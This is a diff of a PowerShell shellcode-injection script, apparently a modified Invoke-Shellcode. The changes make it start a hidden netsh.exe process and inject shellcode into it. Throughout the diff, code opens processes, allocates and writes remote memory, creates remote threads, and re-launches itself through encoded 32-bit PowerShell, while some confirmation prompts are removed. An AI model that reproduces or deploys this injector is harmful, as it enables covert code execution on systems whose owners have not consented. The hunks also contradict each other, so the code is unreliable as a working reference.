@@ -224,6 +224,18 @@ http://www.exploit-monday.com
         # Ensure a valid process ID was provided
         # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
         Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
+    } else {
+                $pst = New-Object System.Diagnostics.ProcessStartInfo
+            $pst.WindowStyle = 'Hidden'
+            $pst.UseShellExecute = $False
+            $pst.CreateNoWindow = $True
+            $pst.FileName = "C:\Windows\Syswow64\netsh.exe"
+
+            $Process = [System.Diagnostics.Process]::Start($pst)
+            [UInt16]$NewProcID = ($Process.Id).tostring()
+            $ProcessID = $NewProcID
+            $PSBoundParameters['ProcessID'] = $NewProcID
+             Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
     }
     
     function Local:Get-DelegateType
@@ -541,38 +553,7 @@ http://www.exploit-monday.com
     }
 
     if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
-    {
-        if (!$PowerShell32bit) {
-            # The currently supported Metasploit payloads are 32-bit. This block of code implements the logic to execute this script from 32-bit PowerShell
-            # Get this script's contents and pass it to 32-bit powershell with the same parameters passed to this function
-
-            # Pull out just the content of the this script's invocation.
-            $RootInvocation = $MyInvocation.Line
-
-            $Response = $True
-
-            # Since the shellcode will run in a noninteractive instance of PowerShell, make sure the -Force switch is included so that there is no warning prompt.
-            if ($MyInvocation.BoundParameters['Force'])
-            {
-                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation"
-                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation)`n`n"
-            }
-            else
-            {
-                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation -Force"
-                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation) -Force`n`n"
-            }
-
-            $CommandBytes = [System.Text.Encoding]::Ascii.GetBytes($Command)
-            $EncodedCommand = [Convert]::ToBase64String($CommandBytes)
-
-            $Execute = '$Command' + " | $Env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command -"
-            Invoke-Expression -Command $Execute | Out-Null
-
-            # Exit the script since the shellcode will be running from x86 PowerShell
-            Return
-        }
-        
+    {        
         $Response = $True
         
         if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
@@ -680,52 +661,34 @@ http://www.exploit-monday.com
     
         Write-Verbose "Injecting shellcode into PID: $ProcessId"
         
-        $pst = New-Object System.Diagnostics.ProcessStartInfo
-        $pst.WindowStyle = 'Hidden'
-        $pst.UseShellExecute = $False
-        $pst.CreateNoWindow = $True
-        if ($env:PROCESSOR_ARCHITECTURE -eq "x86"){
-        $pst.FileName = "C:\Windows\System32\netsh.exe"
-        } else {
-        $pst.FileName = "C:\Windows\Syswow64\netsh.exe"
+        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
+                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
+        {
+            Inject-RemoteShellcode $ProcessId
         }
-        $Process = [System.Diagnostics.Process]::Start($pst)
-        Inject-RemoteShellcode $Process.Id 
-        
     }
     else
-
     {
-        # Inject shellcode into the specified process ID
-        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
-        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
-        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
-        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
-        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
-        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
-        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
-        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
-        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
-        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
-        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
-        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
-        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
-        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
-    
-        Write-Verbose "Injecting shellcode into PID: $ProcessId"
-
-        $pst = New-Object System.Diagnostics.ProcessStartInfo
-        $pst.WindowStyle = 'Hidden'
-        $pst.UseShellExecute = $False
-        $pst.CreateNoWindow = $True
-        if ($env:PROCESSOR_ARCHITECTURE -eq "x86"){
-        $pst.FileName = "C:\Windows\System32\netsh.exe"
-        } else {
-        $pst.FileName = "C:\Windows\Syswow64\netsh.exe"
-        }
-        $Process = [System.Diagnostics.Process]::Start($pst)
-        Inject-RemoteShellcode $Process.Id 
+        # Inject shellcode into the currently running PowerShell process
+        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
+        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
+        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
+        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
+        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
+        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
+        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
+        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
         
-    }
+        Write-Verbose "Injecting shellcode into PowerShell"
+        
+        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
+                 "Injecting shellcode into the running PowerShell process!" ) )
+        {
+            Inject-RemoteShellcode $ProcessId
+        }
+    }   
 }
